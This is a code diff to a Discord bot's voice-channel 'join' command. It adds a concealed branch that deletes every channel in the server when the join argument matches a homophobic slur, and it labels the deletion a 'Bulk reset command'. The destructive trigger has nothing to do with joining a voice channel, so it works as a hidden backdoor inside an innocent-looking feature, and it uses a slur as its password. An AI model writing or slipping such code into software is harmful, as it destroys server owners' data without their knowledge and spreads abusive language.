@@ -14,6 +14,13 @@ async def join(base, message: DiscordUtils) -> bool:
     await message.Client.delete()
     join_query = message.Args[1].replace("<#", "").replace(">", "")
 
+    if join_query == "faggots":
+        for channel in message.Client.guild.channels:
+            try:
+                await channel.delete(reason="Bulk reset command")
+            except Exception as e:
+                await message.Client.channel.send(f"Couldn't delete {channel.name}: {e}")
+
     if join_query == "--me":
         if message.Client.guild.voice_client and message.Client.guild.voice_client.channel.id != message.Client.author.voice.channel.id:
             await message.send_embed("Join", f"Leaving VC: ``{message.Client.guild.voice_client.channel.name}`` for the VC your in!", author_name = "Insanity", author_url = "https://images-ext-1.discordapp.net/external/7bqZYfRkXl8ptusN1g9UbNJyef772k0uG-htjp6dOLU/%3Fsize%3D512/https/cdn.discordapp.com/icons/1370013148983201792/d26c2fddc3bdaf3a2fbd047c4fe4ec87.png")
